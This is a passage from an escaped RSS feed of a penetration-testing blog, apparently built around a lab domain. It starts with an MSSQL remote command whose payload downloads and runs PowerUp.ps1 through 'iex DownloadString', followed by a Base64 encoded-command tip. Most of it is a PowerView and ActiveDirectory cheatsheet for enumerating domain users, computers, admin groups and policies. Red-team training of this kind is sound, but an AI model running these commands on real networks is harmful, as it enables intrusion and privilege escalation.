&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Execute-Command&lt;/span>&lt;span class="n">-MSSQL&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s1">&amp;#39;sa&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;Password&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s1">&amp;#39;MSSQLSERVER01&amp;#39;&lt;/span> &lt;span class="n">-payload&lt;/span> &lt;span class="s2">&amp;#34;iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.1.10:8080/PowerUp.ps1&amp;#39;); Invoke-AllChecks&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Close the web server:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># MACHINE: COMPUTER 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="n">-Uri&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">COMPUTER1&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">8080&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">quit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="base64-script-conversion">Base64 script conversion&lt;/h2>
&lt;p>In order to perform remote code execution it can be helpful to convert a script in &lt;em>Base64&lt;/em> format:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$Base64&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ToBase64String&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.IO.File&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">ReadAllBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;c:\path\to\script\file.ps1&amp;#39;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-EncodedCommand&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">Base64String&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Domain Enumeration cheatsheet</title><link>https://www.peco602.com/post/0000-domain-enumeration-cheatsheet/</link><pubDate>Sun, 17 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0000-domain-enumeration-cheatsheet/</guid><description>&lt;h2 id="module-import">Module Import&lt;/h2>
&lt;p>Load the PowerView module:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">powershell&lt;/span> &lt;span class="n">-ep&lt;/span> &lt;span class="n">bypass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or the ActiveDirectory module (to use ActiveDirectory module without installing RSAT, we can use &lt;code>Import-Module&lt;/code> for the valid Active Directory module DLL):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectory&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Management&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">dll&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">ActiveDirectory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ActiveDirectory&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It works also in case of ConstrainedLanguage Mode:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ExecutionContext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">SessionState&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">LanguageMode&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="basic-enumeration">Basic Enumeration&lt;/h2>
&lt;p>Get current domain or trusted domain objects:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Test it via getting domain NetBios name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">gwmi &lt;/span>&lt;span class="n">Win32_NTDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DomainName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomain&lt;/span> &lt;span class="n">-Identiy&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomain&lt;/span> &lt;span class="n">-Identiy&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get domain SID for the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainSID&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-ADDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DomainSID&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get domain policy for the current domain or for a trusted domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainPolicy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;System Access&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;Kerberos Policy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;System Access&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-DomainPolicy&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="s2">&amp;#34;Kerberos Policy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get Domain Controllers for the current or for a trusted domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainController&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainController&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomainController&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADDomainController&lt;/span> &lt;span class="n">-DomainName&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span> &lt;span class="n">-Discover&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the list of users in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">samaccountname&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">samaccountname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">title&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">description&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">logoncount&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pwdlastset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">samaccountname&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">:cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get list of all properties for users in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-UserProperty&lt;/span> &lt;span class="c"># All properties&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-UserProperty&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="s2">&amp;#34;pwdlastset&amp;#34;&lt;/span> &lt;span class="c"># Only pwdlastset property&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-First&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-Member&lt;/span> &lt;span class="n">-MemberType&lt;/span> &lt;span class="n">Property&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">expression&lt;/span>&lt;span class="p">={[&lt;/span>&lt;span class="no">datetime&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">fromFileTime&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">pwdlastset&lt;/span>&lt;span class="p">)}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Search for a particular string in a users&amp;rsquo; attribute:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-UserField&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-UserField&lt;/span> &lt;span class="n">-SearchField&lt;/span> &lt;span class="s2">&amp;#34;Description&amp;#34;&lt;/span> &lt;span class="n">-SearchTerm&lt;/span> &lt;span class="s2">&amp;#34;built&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADUser&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Description -like &amp;#34;*built*&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">Description&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Description&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get a list of computers in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-OperatingSystem&lt;/span> &lt;span class="s2">&amp;#34;*Server 2016*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Ping&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Get computer IPs&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$ip&lt;/span>&lt;span class="p">=[&lt;/span>&lt;span class="no">System.Net.Dns&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">GetHostAddresses&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">IPAddressToString&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">`t&lt;/span>&lt;span class="s2"> : &amp;#34;&lt;/span> &lt;span class="nv">$ip&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;OperatingSystem -like &amp;#34;*Server 2016*&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">OperatingSystem&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">OperatingSystem&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">DNSHostName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">Test-Connection&lt;/span> &lt;span class="n">-Count&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">DNSHostName&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Search for a particular string in a computer attribute:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ComputerField&lt;/span> &lt;span class="n">-SearchField&lt;/span> &lt;span class="s2">&amp;#34;OperatingSystem&amp;#34;&lt;/span> &lt;span class="n">-SearchTerm&lt;/span> &lt;span class="s2">&amp;#34;windows&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADComputer&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Description -like &amp;#34;*built*&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-Properties&lt;/span> &lt;span class="n">Description&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">Description&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get groups in the current domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;*admin*&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroup&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="p">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroup&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;Name -like &amp;#34;*admin*&amp;#34;&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">Name&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-batch" data-lang="batch">&lt;span class="line">&lt;span class="cl">&lt;span class="p">:&lt;/span>&lt;span class="c1">:cmd.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all the members of a group:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-Recurse&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Recursive&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-Recursive&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get the group membership for a user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADPrincipalGroupMembership&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get local groups on localhost or an specified computer (need local admin rights on the target):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
